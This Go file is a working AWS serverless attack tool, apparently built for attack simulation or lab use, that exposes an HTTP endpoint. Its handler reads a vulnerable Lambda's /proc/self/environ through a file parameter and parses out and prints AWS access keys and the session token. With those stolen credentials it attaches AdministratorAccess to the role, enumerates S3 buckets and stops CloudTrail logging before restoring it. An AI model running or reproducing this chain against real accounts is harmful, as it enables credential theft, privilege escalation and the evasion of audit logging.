package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/cloudtrail"
	"github.com/aws/aws-sdk-go/service/iam"
	"github.com/aws/aws-sdk-go/service/s3"
	"github.com/aws/aws-sdk-go/service/sts"
)

func getEnvironData(apiURL string) (string, error) {
	resp, err := http.Get(apiURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	data := make([]byte, 2048)
	n, err := resp.Body.Read(data)
	if err != nil {
		return "", err
	}

	return string(data[:n]), nil
}

func parseAwsCredentials(environData string) (string, string, string) {
	awsSessionTokenPattern := `AWS_SESSION_TOKEN=(.*?)\n`
	awsAccessKeyIDPattern := `AWS_ACCESS_KEY_ID=(.*?)\n`
	awsSecretAccessKeyPattern := `AWS_SECRET_ACCESS_KEY=(.*?)\n`

	awsSessionToken := regexp.MustCompile(awsSessionTokenPattern).FindStringSubmatch(environData)[1]
	awsAccessKeyID := regexp.MustCompile(awsAccessKeyIDPattern).FindStringSubmatch(environData)[1]
	awsSecretAccessKey := regexp.MustCompile(awsSecretAccessKeyPattern).FindStringSubmatch(environData)[1]

	fmt.Printf("KEYID: %s\n", awsAccessKeyID)
	fmt.Printf("SECRET: %s\n", awsSecretAccessKey)
	fmt.Printf("TOKEN: %s\n", awsSessionToken)

	return awsAccessKeyID, awsSecretAccessKey, awsSessionToken
}

func assumeRole(sts_svc *sts.STS) string {
	params := &sts.GetCallerIdentityInput{}

	resp, err := sts_svc.GetCallerIdentity(params)
	if err != nil {
		log.Println(err)
		return ""
	}

	return *resp.Arn
}

func attachAdminPolicyToRole(iam_svc *iam.IAM, roleName string) {

	arn := "arn:aws:iam::aws:policy/AdministratorAccess"
	params := &iam.AttachRolePolicyInput{
		PolicyArn: aws.String(arn),
		RoleName:  aws.String(roleName),
	}

	_, err := iam_svc.AttachRolePolicy(params)
	if err != nil {
		log.Println(err)
		return
	}
}

func detachAdminPolicyToRole(iam_svc *iam.IAM, roleName string) {

	policyArn := "arn:aws:iam::aws:policy/AdministratorAccess"
	params := &iam.DetachRolePolicyInput{
		PolicyArn: aws.String(policyArn),
		RoleName:  aws.String(roleName),
	}

	_, err := iam_svc.DetachRolePolicy(params)
	if err != nil {
		log.Println(err)
		return
	}
}

func listS3Buckets(s3_svc *s3.S3) []*s3.Bucket {
	params := &s3.ListBucketsInput{}
	resp, err := s3_svc.ListBuckets(params)
	if err != nil {
		log.Println(err)
		return nil
	}

	return resp.Buckets
}

func checkBucketConfig(s3_svc *s3.S3, bucketName string) (string, string) {
	loggingStatus := "Disabled"
	aclStatus := "Unknown"

	// Get bucket logging status
	params := &s3.GetBucketLoggingInput{
		Bucket: aws.String(bucketName),
	}
	_, err := s3_svc.GetBucketLogging(params)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok && aerr.Code() == "NoSuchBucket" {
			loggingStatus = "Bucket not found"
		} else {
			log.Println(err)
		}
	} else {
		loggingStatus = "Enabled"
	}

	// Check bucket ACL status
	params2 := &s3.GetBucketAclInput{
		Bucket: aws.String(bucketName),
	}
	_, err2 := s3_svc.GetBucketAcl(params2)
	if err2 != nil {
		if aerr, ok := err2.(awserr.Error); ok && aerr.Code() == "NoSuchBucket" {
			aclStatus = "Bucket not found"
		} else {
			log.Println(err2)
		}
	} else {
		aclStatus = "Exists"
	}

	return loggingStatus, aclStatus
}

func stopCloudTrailLogging(ct_svc *cloudtrail.CloudTrail, trailName string) bool {

	params := &cloudtrail.DescribeTrailsInput{
		TrailNameList: []*string{aws.String(trailName)},
	}

	resp, err := ct_svc.DescribeTrails(params)
	if err != nil {
		log.Println(err)
		return false
	}

	if len(resp.TrailList) > 0 {
		trail := resp.TrailList[0]
		if *trail.Name == trailName {
			params := &cloudtrail.StopLoggingInput{
				Name: &trailName,
			}

			_, err := ct_svc.StopLogging(params)
			if err != nil {
				log.Println(err)
				return false
			}

			fmt.Printf("CloudTrail logging for '%s' has been stopped.\n", trailName)
			return true
		}
		fmt.Printf("Error: Trail '%s' not found.\n", trailName)
		return false
	}

	fmt.Printf("Error: Unable to retrieve trail information.\n")
	return false
}

func startCloudTrailLogging(ct_svc *cloudtrail.CloudTrail, trailName string) bool {

	params := &cloudtrail.StartLoggingInput{
		Name: &trailName,
	}

	_, err := ct_svc.StartLogging(params)
	if err != nil {
		log.Println(err)
		return false
	}

	fmt.Printf("CloudTrail logging for '%s' has been re-enabled.\n", trailName)
	return true
}

// GetCloudTrailTrails returns a list of CloudTrail trails in the specified AWS region.
func GetCloudTrailTrails(region string, ct_svc *cloudtrail.CloudTrail) ([]*cloudtrail.Trail, error) {

    // Call DescribeTrails API to get the list of trails
    resp, err := ct_svc.DescribeTrails(&cloudtrail.DescribeTrailsInput{})
    if err != nil {
        return nil, err
    }

    // Return the list of trails
    return resp.TrailList, nil
}

// Struct for a simple JSON response
type jsonResponse struct {
	Message string `json:"message"`
}

func serverlesspathHandler(w http.ResponseWriter, r *http.Request) {
	// Gather AWS Region
	region := os.Getenv("REGION")
	// Log the request and Log the AGW_URL environment variable value
	log.Printf("Received request for /serverlesspath from %s", r.RemoteAddr)
	illegalAccess := os.Getenv("AGW_URL") + "?file=/proc/self/environ"
	log.Printf("Generating Malicous Endpoint URL: %s", illegalAccess)

	// Call API+Lambda to Get its Variable Values
	environData, err := getEnvironData(illegalAccess)
	if err != nil {
		log.Fatal(err)
	}
	//Set the credentials i am going after
	awsAccessKeyID, awsSecretAccessKey, awsSessionToken := parseAwsCredentials(environData)

	//Set stolen credentails
	stolen_cfg := &aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
	}

	//set up client services for AWS with stolen creds
	s3_svc := s3.New(session.New(), stolen_cfg)
	sts_svc := sts.New(session.New(), stolen_cfg)
	iam_svc := iam.New(session.New(), stolen_cfg)
	ct_svc := cloudtrail.New(session.New(), stolen_cfg)
	
	// 1. Assume the IAM Role and provide back the ARN and Role Name
	callerIdentity := assumeRole(sts_svc)
	fmt.Printf("AssumedRoleARN: %s\n", callerIdentity)
	segment := strings.Split(callerIdentity, "/")
	roleName := segment[len(segment)-2]
	fmt.Printf("VulnerableLambdaRoleName: %s\n", roleName)

	// 2. Permissions Elevated to Admin to perform more actions
	attachAdminPolicyToRole(iam_svc, roleName)
	time.Sleep(8 * time.Second)

	// Enumerate S3 Services and Configurations here i look for 3 buckets to trigger enumeration event
	buckets := listS3Buckets(s3_svc)
	bucketCount := 0

	for _, bucket := range buckets {
		bucketName := *bucket.Name
		loggingStatus, aclStatus := checkBucketConfig(s3_svc, bucketName)

		fmt.Printf("Bucket Name: %s\n", bucketName)
		fmt.Printf("Logging Status: %s\n", loggingStatus)
		fmt.Printf("S3 ACL Status: %s\n", aclStatus)
		fmt.Println()

		bucketCount++
		if bucketCount >= 3 {
			break
		}
	}

	// 3. Get a list of all CloudTrail Trails
	trails, err := GetCloudTrailTrails(region, ct_svc)
    if err != nil {
        log.Fatalf("Error getting CloudTrail trails: %v", err)
    }
	// create an array if multiple trails exist
	var disabled_trails_list []string

	// 4. loop through trails returned and stop logging if in same region.
	for _, trail := range trails {
		trailName := *trail.Name
		success := stopCloudTrailLogging(ct_svc, trailName)
		if success {
			fmt.Printf("Stopped CloudTrail logging for '%s'.\n", trailName)
			disabled_trails_list = append(disabled_trails_list, *trail.Name)
		} else {
			fmt.Printf("Failed to stop CloudTrail logging for '%s'.\n", trailName)
		}
		// wait a few seconds and re-enable CT logging
		time.Sleep(5 * time.Second)
		startCloudTrailLogging(ct_svc, trailName)
	}
	// 5. Detach the admin policy so can be executed again
	detachAdminPolicyToRole(iam_svc, roleName)
	
	// Create a JSON response for Frontend
	disabledTrailsStr := strings.Join(disabled_trails_list, ", ")
	response := struct {
		EndpointURLTargeted   string `json:"EndpointURLTargeted"`
		AssumedLambdaRoleName string `json:"AssumedLambdaRoleName"`
		AssumedRoleARN        string `json:"AssumedRoleARN"`
		EscalatePrivileges    string `json:"EscalatePrivileges"`
		ServiceEnumeration    string `json:"ServiceEnumeration"`
		DefensiveEvasion      string `json:"DefensiveEvasion"`
	}{
		EndpointURLTargeted:   illegalAccess,
		AssumedLambdaRoleName: roleName,
		AssumedRoleARN:        callerIdentity,
		EscalatePrivileges:    "attaching: arn:aws:iam::aws:policy/AdministratorAccess",
		ServiceEnumeration:    "Enumerating through S3 Resources checking ACL Configurations",
		DefensiveEvasion:      "Temporarily impairing CloudTrail Logging on: " + disabledTrailsStr,
	}
	// Set content type to JSON before writing the body
	w.Header().Set("Content-Type", "application/json")

	if err := json.NewEncoder(w).Encode(response); err != nil {
		log.Println("Error encoding JSON response:", err)
		w.WriteHeader(http.StatusInternalServerError)
	}
}

// entry point
func main() {
	// Define the /serverlesspath route and its handler
	mux := http.NewServeMux()
	mux.HandleFunc("/serverless/attack", serverlesspathHandler)

	// Start the HTTP server on your chosen port
	port := "4200"
	fmt.Printf("Serverless Attack Path server is running on port %s...\n", port)
	if err := http.ListenAndServe(":"+port, mux); err != nil {
		log.Fatal("Error starting server:", err)
	}
}
